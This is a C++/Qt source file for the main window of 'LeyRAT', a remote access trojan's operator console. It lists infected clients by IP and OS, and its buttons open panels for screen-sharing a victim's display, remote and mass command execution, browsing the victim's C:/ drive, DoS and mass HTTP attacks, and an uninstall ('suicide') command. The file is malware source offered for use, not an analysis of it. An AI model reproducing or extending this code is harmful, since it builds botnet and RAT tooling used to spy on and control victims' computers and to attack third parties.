#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QStatusBar>

#include <Windows.h>
#include "leyrat.h"

extern leyrat rat;

Ui::MainWindow *mainwin = 0;
SRuncommand *sruncmd = 0;

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    mainwin = ui;
    ui->setupUi(this);

    QPixmap pic("yuno.png");
    QPixmap scaled=pic.scaled ( 211, 261 );
    ui->label_picyuno->setPixmap(scaled);
    ui->tableWidget->setEditTriggers(ui->tableWidget->NoEditTriggers);
    ui->tableWidget->verticalHeader()->hide();
    ui->tableWidget->setSelectionBehavior(ui->tableWidget->SelectRows);
    ui->tableWidget->setRowCount(0);

    ui->tableWidget->resizeRowsToContents(); // Adjust the row height.
    ui->tableWidget->resizeColumnsToContents(); // Adjust the column width.
    ui->tableWidget->setColumnWidth( 0, 35 );
    ui->tableWidget->setColumnWidth( 1, 127 );
    ui->tableWidget->setColumnWidth( 2, 88 );
    ui->tableWidget->setColumnWidth( 3, 58 );


    ui->tableWidget->setRowCount(1);
    ui->tableWidget->setItem(0, 0, new QTableWidgetItem("la"));
    ui->tableWidget->setItem(0, 1, new QTableWidgetItem("12345678912345678912"));
    ui->tableWidget->setItem(0, 2, new QTableWidgetItem("133.133.133.700"));

    //strip 'Edition', turn 'Windows' into 'Win'
    //only use first letters e.g.
    //home premium ->HP
    //home basic->HB
    //enterprise->E, education->ED


    ui->tableWidget->setItem(0, 3, new QTableWidgetItem("Win10 ED"));
    ui->tableWidget->setRowHeight( 0, 20);

    this->setWindowTitle("LeyRAT");

    this->setWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint | Qt::MSWindowsFixedSizeDialogHint);



    ui->tableWidget->horizontalHeader()->setSectionResizeMode(QHeaderView::Fixed);

    screenshare = new Screenshare(this);
    dos = new Dos(this);
    runcommand = new Runcommand(this);
    sruncommand = new SRuncommand(this);
    sruncmd = sruncommand;
    filebrowser = new Filebrowser(this);
    masshttp = new Masshttp(this);
    offlineusers = new Offlineusers(this);
    adduser = new Adduser(this);
    funstuff = new Funstuff(this);

    ui->pushButton->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_2->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_3->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_4->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_5->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_6->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_7->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_8->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_9->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_10->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_11->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_13->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_14->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_15->setFocusPolicy(Qt::NoFocus);

}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_pushButton_4_pressed()//dos
{
    dos->setVisible(!dos->isVisible());

}

void MainWindow::on_pushButton_3_pressed()//screenshare
{

    if(screenshare->isVisible())
    {
        for(int i=0;i<rat.numonlineclients;i++)
        {
            onlineuser *cl = rat.GetClient(i);
            cl->is_screensharing = false;
        }
    }

    screenshare->setVisible(!screenshare->isVisible());

}

void MainWindow::on_pushButton_2_pressed()//run command
{

    sruncommand->setVisible(!sruncommand->isVisible());

}

void MainWindow::on_pushButton_pressed()//file browser
{
    filebrowser->setVisible(!filebrowser->isVisible());

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_FileList(item->text().toStdString().c_str(), "C:/*.*");
        break;

    }

}

void MainWindow::on_pushButton_7_pressed()//add user
{
    adduser->setVisible(!adduser->isVisible());
}

void MainWindow::on_pushButton_6_pressed()//remove user
{

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_Suicide(item->text().toStdString().c_str());

    }
}

void MainWindow::on_pushButton_9_pressed()
{
  masshttp->setVisible(!masshttp->isVisible());
}

void MainWindow::on_pushButton_10_pressed()//user logs
{
    //shellexec, open users userlogs folder
}

void MainWindow::on_pushButton_8_pressed()//offline users
{
    offlineusers->setVisible(!offlineusers->isVisible());
}

void MainWindow::on_pushButton_5_pressed()//fun stuff
{
    funstuff->setVisible(!funstuff->isVisible());
}

void MainWindow::on_pushButton_11_pressed()//mass run command
{
    runcommand->setVisible(!runcommand->isVisible());
}
